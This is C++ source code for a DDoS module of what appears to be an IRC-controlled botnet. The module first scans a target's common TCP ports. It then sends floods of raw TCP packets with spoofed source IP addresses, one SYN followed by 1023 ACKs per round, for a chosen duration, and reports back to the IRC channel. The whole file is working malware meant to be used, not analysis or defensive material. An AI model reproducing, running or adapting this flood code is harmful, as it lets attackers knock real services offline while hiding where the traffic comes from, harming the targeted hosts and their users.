#include "main.h"
#include "mainctrl.h"

struct ip
  {
#if __BYTE_ORDER == __LITTLE_ENDIAN
    u8 ihl:4, ver:4;
#else
    u8 ver:4, ihl:4;
#endif
    u8 tos;
    u16 tl, id, off;
    u8 ttl, pro;
    u16 sum;
    u32 src, dst;
  };

struct tcphdr
  {
    u16 src, dst;
    u32 seq, ack;
#if __BYTE_ORDER == __LITTLE_ENDIAN
    u8 x2:4, off:4;
#else
    u8 off:4, x2:4;
#endif
    u8 flg;
#define FIN  0x01
#define SYN  0x02
#define RST  0x04
#define PUSH 0x08
#define ACK  0x10
#define URG  0x20
    u16 win, sum, urp;
  };

struct ip_hdr_wonk {
    u_int       ip_hl:4,                /* header length in 32 bit words */
                ip_v:4;                 /* ip version */
    u_char      ip_tos;                 /* type of service */
    u_short     ip_len;                 /* total packet length */
    u_short     ip_id;                  /* identification */
    u_short     ip_off;                 /* fragment offset */
    u_char      ip_ttl;                 /* time to live */
    u_char      ip_p;                   /* protocol */
    u_short     ip_sum;                 /* ip checksum */
    u_long      saddr, daddr;           /* source and dest address */
};

struct tcp_hdr_wonk {
    u_short     th_sport;               /* source port */
    u_short     th_dport;               /* destination port */
    u_long      th_seq;                 /* sequence number */
    u_long      th_ack;                 /* acknowledgement number */
    u_int       th_x2:4,                /* unused */
                th_off:4;               /* data offset */
    u_char      th_flags;               /* flags field */
    u_short     th_win;                 /* window size */
    u_short     th_sum;                 /* tcp checksum */
    u_short     th_urp;                 /* urgent pointer */
};

struct tcpopt_hdr_wonk {
    u_char  type;                       /* type */
    u_char  len;                                /* length */
    u_short value;                      /* value */
};

struct pseudo_hdr_wonk {                     /* See RFC 793 Pseudo Header */
    u_long saddr, daddr;                        /* source and dest address */
    u_char mbz, ptcl;                   /* zero and protocol */
    u_short tcpl;                       /* tcp length */
};

struct packet {
    struct ip ip;
    struct tcphdr tcp;
};

struct cksum {
    struct pseudo_hdr_wonk pseudo;
    struct tcphdr tcp;
};

struct packet packet;
struct cksum cksum;
struct sockaddr_in s_in;
u_short dstport, pktsize, pps;
int sock=0;

inline unsigned long spoofip (unsigned long t_target)
{
	struct in_addr hax0r;
	char convi[16];
	int a, b, c, d;
	hax0r.s_addr = htonl (t_target);
	sscanf (inet_ntoa (hax0r), "%d.%d.%d.%d", &a, &b, &c, &d);
	a = brandom(1,254);
	b = brandom(1,254);
	sprintf (convi, "%d.%d.%d.%d", d, c, b, a);
	return inet_addr (convi);
}

int connect_no_timeout(SOCKET sockfd,
						const struct sockaddr *addr,
						socklen_t addrlen,
						struct timeval *timeout)
{
	int error = 0, error_len, ret;
	u_long non_block = TRUE, block = FALSE;

	fd_set rset, wset;

	if (timeout == NULL)	{
		/* blocking mode */
		return connect(sockfd, addr, addrlen);
	}
	
	/* Set the socket to be non-blocking */
	ioctlsocket(sockfd, FIONBIO, &non_block);

	if (connect(sockfd, addr, addrlen) == SOCKET_ERROR) {
		if (WSAGetLastError() != WSAEWOULDBLOCK) {
			return SOCKET_ERROR;
		}
	}

	FD_ZERO(&rset);
	FD_SET(sockfd, &rset);
	FD_ZERO(&wset);
	FD_SET(sockfd, &wset);

	if ((ret = select(sockfd + 1, &rset, &wset, NULL, timeout)) == 0) {
		WSASetLastError(WSAETIMEDOUT);
		return SOCKET_ERROR;
	}

	if (ret == SOCKET_ERROR) {
		return SOCKET_ERROR;
	}

	if(FD_ISSET(sockfd, &rset) || FD_ISSET(sockfd, &wset)) {
		error_len = sizeof(error);
		if (getsockopt(sockfd, SOL_SOCKET, SO_ERROR, (char *) &error, &error_len) == SOCKET_ERROR) {
			return SOCKET_ERROR;
		}
	} else {
		/* whoops: sockfd has disappeared */
		return SOCKET_ERROR;
	}

	/* Set the socket back to blocking
	ioctlsocket(sockfd, FIONBIO, &block);
	*/

	if (error) { 
		WSASetLastError(error);
		return SOCKET_ERROR;
	}

	return 0;
}

CString PhatWonkFlood(char *target, int len, int delay);

CDDOSPhatWonkFlood::CDDOSPhatWonkFlood() { m_szType="CDDOSPhatWonkFlood"; m_sDDOSName.Assign("PhatWonk"); }

void CDDOSPhatWonkFlood::StartDDOS()
{	g_pMainCtrl->m_cIRC.SendFormat(m_bSilent, m_bNotice, m_sReplyTo.Str(), "%s: flooding %s for %u seconds, %d ms delay.", m_sDDOSName.CStr(), m_sHost.CStr(), m_iTime, m_iDelay);
	CString sReply; sReply.Format("%s: %s [%s]", m_sDDOSName.CStr(), m_sHost.CStr(), PhatWonkFlood(m_sHost.Str(), m_iTime, m_iDelay).CStr());
	g_pMainCtrl->m_cIRC.SendFormat(m_bSilent, m_bNotice, m_sReplyTo.Str(), "%s", sReply.CStr()); }

CString SendPhatWonk(unsigned long TargetIP, int len, int delay)
{
    BOOL flag=TRUE;
	unsigned long lTimerCount=0;
	struct timespec ts;
    int i=0;

	struct sockaddr_in addr;
	int scansock=0;

	sock=WSASocket(AF_INET,SOCK_RAW,IPPROTO_RAW,NULL,0,WSA_FLAG_OVERLAPPED);
	setsockopt(sock, IPPROTO_IP, IP_HDRINCL, (char*)&flag, sizeof(flag));

    srand(GetTickCount());

	unsigned int port[28] = { 1025,21,22,23,25,53,80,81,88,110,113,119,135,
							  137,139,143,443,445,1024,1433,1500,
							  1720,3306,3389,5000,6667,8000,8080 };

	unsigned int openport[28] = {NULL};
	CString hitports="";
	int hitport=0, lastport=0;
	CString tmpMess="";
	struct timeval working_timeout;
	working_timeout.tv_sec = 3;
	working_timeout.tv_usec = 3000;

	for (i=0;i<28;i++)
	{
		addr.sin_family = AF_INET;
		addr.sin_addr.S_un.S_addr = TargetIP;
		addr.sin_port = htons(port[i]);

		scansock = socket(AF_INET,SOCK_STREAM,0);
		int result = connect_no_timeout(scansock,(struct sockaddr *)&addr,sizeof(struct sockaddr),&working_timeout);
		closesocket(scansock);
		
		if(result == 0)
		{
				openport[i] = port[i];
				/* DEBUG ONLY
				tmpMess.Format("Found Open Port: %d", port[i]);
				g_pMainCtrl->m_cIRC.SendMsg(0, 0,tmpMess.Str(),"#owned");
				*/
		}
	}

	hitports.Format(" ");

	lTimerCount=GetTickCount();
	
	for (i=0;i<28;i++)
	{

	if ((GetTickCount()-lTimerCount)/1000>len) break;

		if (openport[i] != NULL)
		{
			hitport = openport[i];
			hitports.Format("%s%d ",hitports.CStr(),hitport);
		}
		else
		{
			hitport = htons (brandom (0, 65535)); // no open ports
		}
	}

	for (;;)
	{
	
	memset(&packet, 0, sizeof(packet));
    ts.tv_sec                   = 0;
    ts.tv_nsec                  = 10;
    packet.ip.ihl               = 5;
    packet.ip.ver               = 4;
    packet.ip.pro               = IPPROTO_TCP;
    packet.ip.tos               = 0x08;
    packet.ip.id                = htons (brandom (1024, 65535));
    packet.ip.tl                = htons(sizeof(packet));
    packet.ip.off	            = 0;
    packet.ip.ttl               = 255;
    packet.ip.src		        = spoofip(TargetIP);
	packet.ip.dst				= TargetIP;
    packet.tcp.flg	            = 0;
    packet.tcp.win              = htons(16384);
    packet.tcp.seq              = htonl (brandom (0, 65535) + (brandom (0, 65535) << 8));
    packet.tcp.ack              = 0;
    packet.tcp.off              = 5;
    packet.tcp.urp              = 0;

	packet.tcp.dst              = hitport;

	cksum.pseudo.daddr          = TargetIP;
    cksum.pseudo.mbz            = 0;
    cksum.pseudo.ptcl           = IPPROTO_TCP;
    cksum.pseudo.tcpl           = htons(sizeof(struct tcphdr));
    s_in.sin_family             = AF_INET;
	s_in.sin_addr.S_un.S_addr	= TargetIP;
    s_in.sin_port               = packet.tcp.dst;

	for(i=0;i<1023;++i) {
	/* 
	send 1 syn packet + 1023 ACK packets. 
	*/
    if(i==0) {
	packet.tcp.src = htons (brandom (0, 65535));
	cksum.pseudo.saddr = packet.ip.src;
	packet.tcp.flg = SYN;
    packet.tcp.ack = 0;
    }
    else {
	packet.tcp.flg = ACK;
	packet.tcp.ack = htons (brandom (0, 65535));
    }
       ++packet.ip.id;
       ++packet.tcp.seq;
       s_in.sin_port = packet.tcp.dst;
       packet.ip.sum         = 0;
       packet.tcp.sum        = 0;
       cksum.tcp             = packet.tcp;
       packet.ip.sum         = checksum((unsigned short *)&packet.ip, 20);
       packet.tcp.sum        = checksum((unsigned short *)&cksum, sizeof(cksum));

       sendto(sock, (const char *)&packet, sizeof(packet), 0, (struct sockaddr *)&s_in, sizeof(s_in));
	   }

	if((GetTickCount()-lTimerCount)/1000>len) break;
	Sleep(delay);
    }
	return hitports;
}

CString PhatWonkFlood(char *target, int len, int delay)
{	unsigned long TargetIP;
	CDNS cDNS; TargetIP=cDNS.ResolveAddress(target);
	return SendPhatWonk(TargetIP, len, delay); }